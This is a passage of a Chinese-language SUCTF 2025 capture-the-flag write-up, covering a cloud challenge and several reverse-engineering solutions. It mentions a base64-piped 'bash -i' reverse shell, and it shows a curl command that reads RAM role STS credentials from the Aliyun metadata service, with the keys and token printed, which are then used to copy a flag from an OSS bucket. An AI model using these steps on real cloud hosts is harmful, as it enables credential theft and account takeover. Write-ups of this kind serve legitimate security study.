开两个端口的第一个返回的是`python`​的环境，第二个返回的是`bash shell`​，然后如果不用`echo b64 | base64-d |bash -i`​而是只有`/bin/bash`​然后手动输入反弹`bash shell`​的`payload`​成功率巨低无比。。。

题目名提示了也在`aliyun`​上，可以去找`aliyun`​的元数据在哪里

[链接1](https://developer.aliyun.com/article/1626332#:\~:text\=%E5%90%84%E5%A4%A7%E4%BA%91%E5%85%83%E6%95%B0%E6%8D%AE,%EF%BC%9Ahttp%3A%2F%2F169.254.169.254%2F)

[链接2](https://help.aliyun.com/zh/ecs/user-guide/view-instance-metadata?spm\=a2c6h.12873639.article-detail.4.411f3ff64G0pqs)

这里直接在`ECS`​(反弹到的`shell`​)里面获取`sts`​

```Bash
curl -H "X-aliyun-ecs-metadata-token: $TOKEN" http://100.100.100.200/latest/meta-data/ram/security-credentials/oss-root                                                                                    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                            
                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                              
100   893  100   893    0     0  28858      0 --:--:-- --:--:-- --:--:-- 29766                                                                                                                             
 {                                                                                                                                                                                                         
  "AccessKeyId" : "STS.NSy4dsFrQgg9T1Sn86HEpSfGm",                                                                                                                                                         
  "AccessKeySecret" : "9ogWdxi5Qff2Fna38xknBakmgdjQfdo5JgNWuSTMQKUt",                                                                                                                                      
  "Expiration" : "2025-01-13T15:30:13Z",                                                                                                                                                                   
  "SecurityToken" : "CAIS1AJ1q6Ft5B2yfSjIr5DMf97Hq61w0KXSVhfiijhjRMpcvKPsjzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZ2VAI4zb+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH6
04DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGwgIOoQY+nSmQwGPJR
eJb+udQu7JKc2gIYBv0ZNFJ1n7EnGlNRYbLXu/Ir1QXq3esyb6gQz4rK4KNHstGUvdUGoABAn1BUz7d7A/upOPE4w5ha3QAIyrqx7EgAlz/SWDlebYSWq5znabX0kKWtpuV6+oyJj01bbVoAV35NSu3P9Snk1Gu7e7fUmuWow+PKQed8YjGF9EQWdanrh6ynUSbzpbltvdPGhG7
+HRVOsT7OjQz6gJplt44R5e4cXOlXNhayTAgAA==",                                                                                                                                                                 
  "LastUpdated" : "2025-01-13T09:30:13Z",                                                                                                                                                                  
  "Code" : "Success"                                                                                                                                                                                       
}
```

然后就是经典的导入`aliyuncli`​就行

```Bash
aliyun configure --profile default --mode StsToken
aliyun oss ls
aliyun oss ls oss://suctf-flag-bucket --all-versions
aliyun oss cp oss://suctf-flag-bucket/oss-flag ./ --version-id CAEQmwIYgYDA6Lad1qIZIiAyMjBhNWVmMDRjYzY0MDI3YjhiODU3ZDQ2MDc1MjZhOA--
```

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-08-22.png" alt="SUCTF_2025_Writeup-2025-01-14-16-08-22" position="center" style="border-radius: 1px;" >}}

## Reverse

### SU\_BBRE

rc4 We1com3ToReWorld

+i AndPWNT00

通过memcpy实现了栈溢出把function1的地址转成字符即可

We1com3ToReWorld\="@AndPWNT00

### SU\_mapmap2

```Python
import idaapi
ea = 0x12F33C0 #0x63F530
elem_size = 0x40
for i in range(799):
    cur = ea+elem_size*i
    tree_node = idaapi.get_qword(cur+16)
    cur_value = idaapi.get_qword(tree_node+32)
    if cur_value == 6:
        print(i)
        another_tree = idaapi.get_qword(tree_node+24)
        tb = idaapi.get_qword(tree_node+40)
        tb = idaapi.get_qword(tb+8)
        while idaapi.get_qword(tb+8) != 1:
            tb = idaapi.get_qword(tb)
        print("a:",(idaapi.get_qword(tb+16)-ea)//0x40)
        tb = idaapi.get_qword(tree_node+40)
        tb = idaapi.get_qword(tb+32)
        while idaapi.get_qword(tb+8) != 4:
            tb = idaapi.get_qword(tb)
        print("d:",(idaapi.get_qword(tb+16)-ea)//0x40)
    
        tb = idaapi.get_qword(another_tree+40)
        tb = idaapi.get_qword(tb+24)
        while idaapi.get_qword(tb+8) != 3:
            tb = idaapi.get_qword(tb)
        print("s:",(idaapi.get_qword(tb+16)-ea)//0x40)
        tb = idaapi.get_qword(another_tree+40)
        tb = idaapi.get_qword(tb+56)
        while idaapi.get_qword(tb+8) != 7:
            tb = idaapi.get_qword(tb)
        print("w:",(idaapi.get_qword(tb+16)-ea)//0x40)
    elif cur_value == 7:
        print(i)
        another_tree = tree_node
        tree_node = idaapi.get_qword(another_tree+16)
        tb = idaapi.get_qword(tree_node+40)
        tb = idaapi.get_qword(tb+8)
        while idaapi.get_qword(tb+8) != 1:
            tb = idaapi.get_qword(tb)
        print("a:",(idaapi.get_qword(tb+16)-ea)//0x40)
        tb = idaapi.get_qword(tree_node+40)
        tb = idaapi.get_qword(tb+32)
        while idaapi.get_qword(tb+8) != 4:
            tb = idaapi.get_qword(tb)
        print("d:",(idaapi.get_qword(tb+16)-ea)//0x40)
        tb = idaapi.get_qword(another_tree+40)
        tb = idaapi.get_qword(tb+24)
        while idaapi.get_qword(tb+8) != 3:
            tb = idaapi.get_qword(tb)
        print("s:",(idaapi.get_qword(tb+16)-ea)//0x40)
    
        tb = idaapi.get_qword(another_tree+40)
        tb = idaapi.get_qword(tb+56)
        while idaapi.get_qword(tb+8) != 7:
            tb = idaapi.get_qword(tb)
        print("w:",(idaapi.get_qword(tb+16)-ea)//0x40)

    

   
```

提取路径然后networkx求路径

```Python
import networkx as nx


# 创建一个有向图
G = nx.DiGraph()
with open(r"D:\attachment\suctf2024\_media_file_task_bfcb5ab8-4a79-43af-99c1-5e71e5fa22a1\map.txt",'r') as f:
    m = f.readlines()
for i in range(799):
    G.add_node(str(i))
for i in range(len(m)//5):
    for _ in range(4):
        tmp = m[i*5+1+_].split(":")
        print(tmp[1].strip())
        print(f"add",str(i),tmp[1].strip(),tmp[0])
        G.add_edge(str(i),tmp[1].strip(),label=tmp[0])

path = nx.shortest_path(G, source="0", target="798")
print(path)

edge_labels = []
for i in range(len(path) - 1):
    u = path[i]
    v = path[i + 1]
    edge_label = G[u][v]['label']
    edge_labels.append(edge_label)
path = "".join(edge_labels)
import hashlib
print(hashlib.md5(path.encode()).hexdigest())
```

### SU\_minesweeper

hex\_parse改了，扫雷z3

```Python
ma = [0x03, 0x04, 0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0x02, 0xFF,
      0xFF, 0x04, 0xFF, 0x07, 0xFF, 0xFF, 0xFF, 0x04, 0x06, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0x05, 0x06, 0x04, 0xFF,
      0x05, 0xFF, 0x04, 0x07, 0xFF, 0x08, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0x06, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x03,
      0x03, 0xFF, 0x03, 0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x05, 0x04, 0x05, 0x07, 0x06, 0xFF, 0xFF,
      0x04, 0xFF, 0x02, 0x01, 0xFF, 0xFF, 0xFF, 0x03, 0x04, 0xFF, 0xFF, 0x05, 0x04, 0x03, 0xFF, 0xFF, 0x07, 0x04, 0x03,
      0xFF, 0xFF, 0x01, 0x01, 0xFF, 0xFF, 0x04, 0x03, 0xFF, 0x02, 0xFF, 0x04, 0x03, 0xFF, 0xFF, 0x02, 0xFF, 0x05, 0x04,
      0xFF, 0xFF, 0x02, 0x02, 0xFF, 0xFF, 0x04, 0xFF, 0x04, 0xFF, 0x03, 0x05, 0x06, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF,
      0x02, 0xFF, 0xFF, 0xFF, 0x01, 0x04, 0xFF, 0xFF, 0x07, 0x05, 0xFF, 0xFF, 0x03, 0x03, 0x02, 0xFF, 0xFF, 0x04, 0xFF,
      0xFF, 0x05, 0x07, 0xFF, 0x03, 0x02, 0x04, 0x04, 0xFF, 0x07, 0x05, 0x04, 0x03, 0xFF, 0xFF, 0x04, 0xFF, 0x02, 0x04,
      0x05, 0xFF, 0xFF, 0x06, 0x05, 0x04, 0xFF, 0x02, 0xFF, 0xFF, 0x07, 0x04, 0xFF, 0xFF, 0x03, 0xFF, 0x04, 0x04, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x03, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x03, 0x05, 0xFF, 0xFF, 0x05,
      0xFF, 0x04, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0x03, 0xFF, 0x04, 0xFF, 0xFF, 0xFF, 0xFF,
      0xFF, 0x06, 0xFF, 0x06, 0x06, 0xFF, 0x07, 0x06, 0x04, 0xFF, 0x04, 0x03, 0xFF, 0x04, 0x03, 0x05, 0x04, 0xFF, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x06, 0x07, 0xFF, 0xFF, 0x04, 0xFF, 0xFF, 0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x05,
      0xFF, 0xFF, 0x06, 0x07, 0x07, 0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0x02, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0x06, 0xFF, 0xFF, 0x07, 0x07, 0x06, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0x03, 0x05, 0xFF, 0x07, 0xFF,
      0x05, 0xFF, 0x06, 0xFF, 0x05, 0xFF, 0xFF, 0x07, 0x08, 0xFF, 0xFF, 0x03, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0x05, 0x03, 0xFF, 0x04, 0x05, 0x05, 0x03, 0xFF, 0xFF, 0x06,
      0x05, 0x05, 0x06, 0xFF, 0x06, 0x05, 0x02, 0x04, 0x03, 0x04, 0xFF, 0xFF, 0x03, 0x04, 0x04, 0x06, 0x05, 0xFF, 0x03,
      0xFF, 0x05, 0x05, 0x05, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0x04, 0xFF, 0xFF, 0x04, 0xFF, 0x07, 0x07, 0x08, 0x06, 0xFF,
      0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0x04, 0xFF, 0x03, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x05,
      0x03]
for i in range(20):
    for j in range(20):
        if ma[i * 20 + j] == 0xff:
            print("*", end="\t")
        else:
            print(ma[i * 20 + j], end="\t")
    print()

from z3 import *

s = Solver()
flag = [BitVec(f"flag[{i}]", 8) for i in range(50)]
for i in range(20):
    for j in range(20):
        if ma[i * 20 + j] == 0xff:
            pass
        else:
            t = 0
            for ii in range(-1, 2, 1):
                for jj in range(-1, 2, 1):

                    if 0 <= ii + i <= 19 and 0 <= jj + j <= 19:
                        a2 = ii + i
                        a3 = jj + j
                        t += (flag[(20 * a2 + a3) // 8] >> ((20 * a2 + a3) & 7)) & 1
                    else:
                        t += 0
            s.add(t == ma[i * 20 + j])
print(s.check())
m = s.model()
for i in range(50):
    print(hex(m.eval(flag[i]).as_long())[2:].zfill(2), end='')

flag = "5bdb69bfc51e65fbb50b2039218e8007e02c8f8807fe740d1b916d096d6f1b6e597dcc677ba8b63b6f1d1446587d61efec7d"
table = "0123456789abcdef"
print()
for i in range(len(flag)):
    print(table[(int(flag[i],16)-6)%16],end='')
```

### SU\_ezlua

LoadString对字符串进行了循环移位，loadcode对字节码部分进行了异或移位，添加了一个新的浮点类型0x3f

一个笨方法，对loadstring和loadcode对应解密地址下hook，dump所有的解密字节

```Python
import struct
def p32(a):
    return struct.pack("<I",a)
def u32(a):
    return struct.unpack("<I", a)[0]
with open(r"D:\attachment\suctf2024\_media_file_task_0b306111-7710-4000-b18e-b051663545b1\codes.txt",'r') as f:
    patch_ = f.readlines()
    patch_ = [p for p in patch_ if "load" in p]
patch_ = [p.split(" ")[2].strip() for p in patch_]


def decrypt(a):
    t = u32(bytes(bytearray(p32(u32(a)^0x32547698))[::-1]))
    return p32(((t<<15)&0xffff8000) | ((t>>(32-15))&0x7fff))
patch_ = [int(p,16) for p in patch_]
print(patch_)
with open(r"D:\attachment\suctf2024\_media_file_task_0b306111-7710-4000-b18e-b051663545b1\chall.luac_dec_string",'rb') as f:
    data = f.read()
data = bytearray(data)
idx = 0
for i in range(len(patch_)):
    idx = data.find(p32(patch_[i]),idx)
    print(idx)
    test = decrypt(data[idx:idx+4])
    for _ in range(4):
        data[idx+_] = test[_]
with open(r"D:\attachment\suctf2024\_media_file_task_0b306111-7710-4000-b18e-b051663545b1\chall.luac_dec",'wb') as f:
    f.write(bytes(data))
```

```Python
def magic(a):
    t = struct.unpack("<I",a)[0]
    return struct.pack("<d",t)
with open(r"D:\attachment\suctf2024\_media_file_task_0b306111-7710-4000-b18e-b051663545b1\chall.luac_dec",'rb') as f:
    data = f.read()
data = bytearray(data)
idx = 0
for i in range(41):
    idx = data.find(b"\x3f",idx)
    data[idx] = 3
    data = data[:idx+1]+bytearray(magic(bytes(data[idx+1:idx+5])))+data[idx+5:]
    idx+=9
open(r"D:\attachment\suctf2024\_media_file_task_0b306111-7710-4000-b18e-b051663545b1\chall.luac_dec_true",'wb').write(bytes(data))
```

改完反编译如下：

```Python
-- filename: 
-- version: lua51
-- line: [0, 0] id: 0
function hex(r0_1)
  -- line: [2, 13] id: 1
  local r2_1 = ""
  local r1_1 = "0123456789abcdef"
  for r9_1 = 1, string.len(r0_1), 1 do
    local r3_1 = string.byte(r0_1, r9_1)
    local r4_1 = And(Shr(r3_1, 4), 15)
    local r5_1 = And(r3_1, 15)
    r2_1 = r2_1 .. string.sub(r1_1, r4_1 + 1, r4_1 + 1) .. string.sub(r1_1, r5_1 + 1, r5_1 + 1)
  end
  return r2_1
end
function from_uint(r0_2)
  -- line: [15, 22] id: 2
  return string.char(And(r0_2, 255), And(Shr(r0_2, 8), 255), And(Shr(r0_2, 16), 255), And(Shr(r0_2, 24), 255))
end
function to_uint(r0_3, r1_3)
  -- line: [24, 33] id: 3
  if r1_3 == nil then
    r1_3 = 1
  end
  return Or(Or(Or(string.byte(r0_3, r1_3), Shl(string.byte(r0_3, r1_3 + 1), 8)), Shl(string.byte(r0_3, r1_3 + 2), 16)), Shl(string.byte(r0_3, r1_3 + 3), 24))
end
function rc4init(r0_4, r1_4)
  -- line: [35, 48] id: 4
  local r4_4 = string.len(r1_4)
  for r9_4 = 0, 255, 1 do
    r0_4[r9_4] = r9_4
  end
  local r3_4 = 0
  for r9_4 = 0, 255, 1 do
    r3_4 = (r3_4 + r0_4[r9_4] + string.byte(r1_4, r9_4 % r4_4 + 1)) % 256
    r0_4[r9_4] = r0_4[r3_4]
    r0_4[r3_4] = r0_4[r9_4]
  end
end
function rc4crypt(r0_5, r1_5)
  -- line: [50, 67] id: 5
  local r7_5 = ""
  local r2_5 = 0
  local r3_5 = 0
  for r11_5 = 0, string.len(r1_5) - 1, 1 do
    r2_5 = (r2_5 + 1) % 256
    r3_5 = (r3_5 + r0_5[r2_5]) % 256
    r0_5[r2_5] = r0_5[r3_5]
    r0_5[r3_5] = r0_5[r2_5]
    local r6_5 = Xor(string.byte(r1_5, r11_5 + 1), r0_5[And(r0_5[r2_5] - r0_5[r3_5], 255)])
    r7_5 = r7_5 .. string.char(r6_5)
    r3_5 = (r3_5 + r6_5) % 256
  end
  return r7_5
end
function rc4(r0_6, r1_6)
  -- line: [69, 74] id: 6
  local r2_6 = {}
  rc4init(r2_6, r1_6)
  return rc4crypt(r2_6, r0_6)
end
function fail()
  -- line: [76, 79] id: 7
  print("wrong")
  os.exit(0)
end
function encrypt(r0_8, r1_8, r2_8)
  -- line: [81, 96] id: 8
  local r6_8 = to_uint(r2_8, 1)
  local r7_8 = to_uint(r2_8, 5)
  local r8_8 = to_uint(r2_8, 9)
  local r9_8 = to_uint(r2_8, 13)
  local r4_8 = 305419896
  local r5_8 = 0
  for r13_8 = 1, 32, 1 do
    r5_8 = And(r5_8 + to_uint(rc4(from_uint(r4_8), r2_8)), 4294967295)
    r0_8 = And(r0_8 + Xor(Xor(Shl(r1_8, 4) + r6_8, r1_8 + r5_8), Shr(r1_8, 5) + r7_8), 4294967295)
    r1_8 = And(r1_8 + Xor(Xor(Shl(r0_8, 4) + r8_8, r0_8 + r5_8), Shr(r0_8, 5) + r9_8), 4294967295)
  end
  return r0_8, r1_8
end
function check(r0_9)
  -- line: [98, 111] id: 9
  local r2_9 = ""
  local r3_9 = "thisshouldbeakey"
  r0_9 = rc4(r0_9, r3_9)
  for r9_9 = 0, 3, 1 do
    local r4_9 = to_uint(r0_9, 1 + 8 * r9_9)
    local r5_9 = to_uint(r0_9, 1 + 8 * r9_9 + 4)
    r4_9, r5_9 = encrypt(r4_9, r5_9, r3_9)
    r2_9 = r2_9 .. from_uint(r4_9) .. from_uint(r5_9)
  end
  return hex(r2_9) == "ac0c0027f0e4032acf7bd2c37b252a933091a06aeebc072c980fa62c24f486c6"
end
function main()
  -- line: [113, 130] id: 10
  print("input flag: ")
  local r0_10 = io.read()
  if string.len(r0_10) ~= 39 then
    fail()
  end
  if string.sub(r0_10, 1, 6) ~= "SUCTF{" then
    fail()
  end
  if string.sub(r0_10, 39) ~= "}" then
    fail()
  end
  if check(string.sub(r0_10, 7, 38)) then
    print("correct")
  else
    fail()
  end
end
main()
```

一个tea+rc4不过都有魔改，注意对string类的操作在str\_bytes里进行了异或

```Python
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define AND(x, y) ((x) & (y))
#define OR(x, y) ((x) | (y))
#define XOR(x, y) ((x) ^ (y))
#define SHL(x, y) ((x) << (y))
#define SHR(x, y) ((x) >> (y))

char* hex(const char* r0_1) {
    static char r2_1[1024] = "";
    const char* r1_1 = "0123456789abcdef";
    int len = strlen(r0_1);
    for (int r9_1 = 0; r9_1 < len; r9_1++) {
        uint8_t r3_1 = (uint8_t)r0_1[r9_1];
        uint8_t r4_1 = AND(SHR(r3_1, 4), 15);
        uint8_t r5_1 = AND(r3_1, 15);
        char temp[3];
        temp[0] = r1_1[r4_1];
        temp[1] = r1_1[r5_1];
        temp[2] = '\0';
        strcat_s(r2_1, temp);
    }
    return r2_1;
}

char* from_uint(uint32_t r0_2,int m) {
    static char result[5];
    result[0] = (char)((AND(r0_2, 255)^(m))+0x23);
    result[1] = (char)((AND(SHR(r0_2, 8), 255) ^ (1+ m)) + 0x23);
    result[2] = (char)((AND(SHR(r0_2, 16), 255) ^ (m+2)) + 0x23);
    result[3] = (char)((AND(SHR(r0_2, 24), 255) ^ (3+m)) + 0x23);
    result[4] = '\0';
    return result;
}

char* de_from_uint(uint32_t r0_2, int m) {
    static char result[5];
    result[0] = (char)((AND(r0_2, 255) - (0x23)) ^m );
    result[1] = (char)((AND(SHR(r0_2, 8), 255)) - 0x23 ^ (1 + m));
    result[2] = (char)((AND(SHR(r0_2, 16), 255) - 0x23) ^ (m + 2) );
    result[3] = (char)((AND(SHR(r0_2, 24), 255) - 0x23) ^ (3 + m) );
    result[4] = '\0';
    return result;
}

uint32_t to_uint(char* r0_3, int r1_3) {
    char tmp[4] = { 0 };
    for (int i = 0; i < 4; i++)
    {
        tmp[i] = (r0_3[r1_3+i] ^ (r1_3 + i)) + 0x23;
    }
    uint32_t t = 0;
    t = SHL((uint32_t)tmp[1], 8);
    return OR(OR(OR((uint32_t)tmp[0]&0xff, SHL((uint32_t)tmp[1] & 0xff, 8)), SHL((uint32_t)tmp[2] & 0xff, 16)), SHL((uint32_t)tmp[3] & 0xff, 24));
}
uint32_t de_to_uint(char* r0_3, int r1_3) {
    char tmp[4] = { 0 };
    for (int i = 0; i < 4; i++)
    {
        tmp[i] = (r0_3[r1_3 + i] - 0x23) ^ (r1_3 + i);
    }
    uint32_t t = 0;
    t = SHL((uint32_t)tmp[1], 8);
    return OR(OR(OR((uint32_t)tmp[0] & 0xff, SHL((uint32_t)tmp[1] & 0xff, 8)), SHL((uint32_t)tmp[2] & 0xff, 16)), SHL((uint32_t)tmp[3] & 0xff, 24));
}

void rc4init(uint8_t* r0_4, const char* r1_4) {
    int r4_4 = strlen(r1_4);
    for (int r9_4 = 0; r9_4 < 256; r9_4++) {
        r0_4[r9_4] = (uint8_t)r9_4;
    }
    int r3_4 = 0;
    for (int r9_4 = 0; r9_4 < 256; r9_4++) {
        r3_4 = (r3_4 + r0_4[r9_4] + (uint8_t)r1_4[r9_4 % r4_4]) % 256;
        uint8_t temp = r0_4[r9_4];
        r0_4[r9_4] = r0_4[r3_4];
        r0_4[r3_4] = temp;
    }
}

char* rc4crypt(uint8_t* sbox, const char* input) {
    static char enc[1024] = "";
    int i = 0;
    int j = 0;
    int len = strlen(input);
    for (int idx = 0; idx < len; idx++) {
        i = (i + 1) % 256;
        j = (j + sbox[i]) % 256;
        uint8_t temp = sbox[i];
        sbox[i] = sbox[j];
        sbox[j] = temp;
        uint8_t r6_5 = XOR((uint8_t)input[idx], sbox[AND(sbox[i] - sbox[j], 255)]);
        enc[idx] = (char)r6_5;
        j = (j + r6_5) % 256;

    }
    enc[len] = '\0';
    return enc;
}
/*
char* de_rc4crypt(uint8_t* _sbox, const char* input) {
    static char enc[1024] = "";
  
    for (int j = 255; j >= 0; j--)
    {
        char sbox[256] = { 0 };
        for (int _ = 0; _ < 256; _++)
            sbox[_] = _sbox[_];
        int len = strlen(input);
        int i = len+1;
        for (int idx = len-1; idx >=0 ; idx--) {
            i = (i - 1) % 256;
            j = (j - sbox[i]) % 256;
            uint8_t temp = sbox[i];
            sbox[i] = sbox[j];
            sbox[j] = temp;
            uint8_t r6_5 = XOR((uint8_t)input[idx], sbox[AND(sbox[i] - sbox[j], 255)]);
            enc[idx] = (char)r6_5;
            j = (j + r6_5) % 256;
        }
        enc[len] = '\0';
    
    }
    return enc;
  
}*/

char* de_rc4crypt(uint8_t* sbox, const char* input) {
    static char enc[1024] = "";
    int i = 0;
    int j = 0;
    int len = strlen(input);
    for (int idx = 0; idx < len; idx++) {
        i = (i + 1) % 256;
        j = (j + sbox[i]) % 256;
        uint8_t temp = sbox[i];
        sbox[i] = sbox[j];
        sbox[j] = temp;
        uint8_t r6_5 = XOR((uint8_t)input[idx], sbox[AND(sbox[i] - sbox[j], 255)]);
        j = (j + input[idx]) % 256;
        //printf("%d,", j);
        enc[idx] = (char)r6_5;
    
    }
    enc[len] = '\0';
    return enc;
}
char* de_rc4(const char* r0_6, const char* r1_6) {
    static uint8_t r2_6[256];
    rc4init(r2_6, r1_6);
    return de_rc4crypt(r2_6, r0_6);
}

char* rc4(const char* r0_6, const char* r1_6) {
    static uint8_t r2_6[256];
    rc4init(r2_6, r1_6);
    return rc4crypt(r2_6, r0_6);
}

void fail() {
    printf("wrong\n");
    exit(0);
}
void decrypt(uint32_t* r0_8, uint32_t* r1_8, const char* r2_8)
{
    uint32_t r6_8 = 0x938e8c97;
    uint32_t r7_8 = 0x958c909a;
    uint32_t r8_8 = 0x918b9087;
    uint32_t r9_8 = 0x998e8990;
    uint32_t r4_8 = 0xe8b79538;
    uint32_t sum = 0;
    uint32_t r5_8[32] = { 0xbcc642e1,0xbfa0c925,0x61a1a38a,0x17858e5a,0xa0a25253,0x832510af,0x1da9a02c,0x8a5e29d4,0x78c6d6e5,0xae7dbd19,0x5c044cae,0xccd96e6e,0xf3f6b557,0xf5a8a0a3,0xa2cf8110,0xa1f4e9e8,0x9bdb1fe9,0x635cd40d,0x9e0b1a92,0x1d85f042,0x7812fc5b,0xa68ebb97,0x6b777934,0xe18eaf3c,0x5f5c7e6d,0x74b26d01,0xceeee6b6,0x75cf41d6,0x2f54a25f,0x688f2f0b,0xee101a18,0xd6c7af50 };
    for (int r13_8 = 31; r13_8 >=0; r13_8--) {
        sum = r5_8[r13_8];

        *r1_8 = AND(*r1_8 - XOR(XOR(SHL(*r0_8, 4) + r8_8, *r0_8 + sum), SHR(*r0_8, 5) + r9_8), 4294967295);
        *r0_8 = AND(*r0_8 - XOR(XOR(SHL(*r1_8, 4) + r6_8, *r1_8 + sum), SHR(*r1_8, 5) + r7_8), 4294967295);
    
    }
}
void encrypt(uint32_t* r0_8, uint32_t* r1_8, const char* r2_8) {
    uint32_t r6_8 = 0x938e8c97;
    uint32_t r7_8 = 0x958c909a;
    uint32_t r8_8 = 0x918b9087;
    uint32_t r9_8 = 0x998e8990;
    uint32_t r4_8 = 0x12345678;
    uint32_t r5_8 = 0;
    for (int r13_8 = 0; r13_8 < 32; r13_8++) {
        r4_8 = to_uint(rc4(from_uint(r4_8,0), r2_8), 0);
        r5_8 = AND(r5_8 + r4_8, 4294967295);
        //printf("0x%x,", r5_8);
        *r0_8 = AND(*r0_8 + XOR(XOR(SHL(*r1_8, 4) + r6_8, *r1_8 + r5_8), SHR(*r1_8, 5) + r7_8), 4294967295);
        *r1_8 = AND(*r1_8 + XOR(XOR(SHL(*r0_8, 4) + r8_8, *r0_8 + r5_8), SHR(*r0_8, 5) + r9_8), 4294967295);
    }
    ;
}
void dec(char* a1, int len) {
    for (int i = 0; i < len; i++)
    {
        a1[i] = (a1[i] ^ i) + 0x23;
    }
}

void de_dec(char* a1, int len) {
    for (int i = 0; i < len; i++)
    {
        a1[i] = (a1[i] - 0x23) ^ i ;
    }
}
int check(char* r0_9) {
    char r2_9[1024] = "";
    const char r3_9[17] = { 151, 140, 142, 147, 154, 144, 140, 149, 135, 144, 139, 145, 144, 137, 142, 153 };
    dec(r0_9,32);
    char* encrypted = rc4(r0_9, r3_9);
  
    for (int r9_9 = 0; r9_9 < 4; r9_9++) {
        uint32_t r4_9 = to_uint(encrypted, 8 * r9_9);
        uint32_t r5_9 = to_uint(encrypted, 8 * r9_9 + 4);
        encrypt(&r4_9, &r5_9, r3_9);
        //decrypt(&r4_9, &r5_9, r3_9);
        strcat_s(r2_9, from_uint(r4_9, 8 * r9_9));
        strcat_s(r2_9, from_uint(r5_9, 8 * r9_9 + 4));
    }
    printf("%s", hex(r2_9));
    return strcmp(hex(r2_9), "ac0c0027f0e4032acf7bd2c37b252a933091a06aeebc072c980fa62c24f486c6") == 0;
}
void CAT_FLAG(char* r0_9) {
    char r2_9[1024] = "";
    const char r3_9[17] = { 151, 140, 142, 147, 154, 144, 140, 149, 135, 144, 139, 145, 144, 137, 142, 153 };
    uint8_t flag_part[] = "01234567890123456789012345678901";
    dec((char*)flag_part, 32);
    char* ttt = rc4((const char*)flag_part, r3_9);

    for (int r9_9 = 0; r9_9 < 4; r9_9++) {
        uint32_t r4_9 = de_to_uint(r0_9, 8 * r9_9);
        uint32_t r5_9 = de_to_uint(r0_9, 8 * r9_9 + 4);
        decrypt(&r4_9, &r5_9, r3_9);
        //decrypt(&r4_9, &r5_9, r3_9);
        strcat_s(r2_9, de_from_uint(r4_9, 8 * r9_9));
        strcat_s(r2_9, de_from_uint(r5_9, 8 * r9_9 + 4));
    }
    char* encrypted = de_rc4(r2_9, r3_9);
    de_dec(encrypted, 32);
    printf("%s", encrypted);

    //return strcmp(hex(encrypted), "ac0c0027f0e4032acf7bd2c37b252a933091a06aeebc072c980fa62c24f486c6") == 0;
}

void main() {
    char r0_10[1024];
  
  
    char enc[] = { 172, 12, 0, 39, 240, 228, 3, 42, 207, 123, 210, 195, 123, 37, 42, 147, 48, 145, 160, 106, 238, 188, 7, 44, 152, 15, 166, 44, 36, 244, 134, 198 };
    char ct[] = { 74, 67, 210, 23, 76, 168, 168, 21, 39, 88, 90, 229, 14, 145, 17, 123, 184, 125, 41, 55, 23, 105, 144, 8, 228, 59, 230, 127, 18, 218, 251, 35 };
    CAT_FLAG(enc);
}

```

### SU\_vm\_master

arm指令集的vm，根据常量可以看出是sm4 不过有魔改

```Python
from idaapi import *
from idc import *

opcodes_ea = 0x5654D9387040
opcodes = []
for i in range(349):
    # 获取opcodes结构体
    cur_op = {}
    cur_op_ea = get_qword(opcodes_ea + i * 8)
    func_ptr = get_qword(get_qword(cur_op_ea) + 16)
    func_name = get_name(func_ptr)
    if func_name == "algorithm":
        func_ptr = get_qword(get_qword(cur_op_ea) + 24)
        func_name = get_name(func_ptr)
    cur_op["func_name"] = func_name
    cur_op["op"] = get_qword(cur_op_ea + 8)
    cur_op["opt1"] = get_qword(cur_op_ea + 16)
    cur_op["opt2"] = get_qword(cur_op_ea + 24)
    cur_op["opt3"] = get_qword(cur_op_ea + 32)
    if cur_op["opt3"] & 0x8000000000000000:
        cur_op["opt3"] = "-"+hex(0x10000000000000000 - cur_op["opt3"])
    else:
        cur_op["opt3"] = hex(get_qword(cur_op_ea + 32))
    opcodes.append(cur_op)

for i in opcodes:
    print(i)
```

```Python
opcodes = [{'func_name': 'mov', 'op': 0, 'opt1': 3, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'add', 'op': 0, 'opt1': 1, 'opt2': 1, 'opt3': '0x2'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x0'},
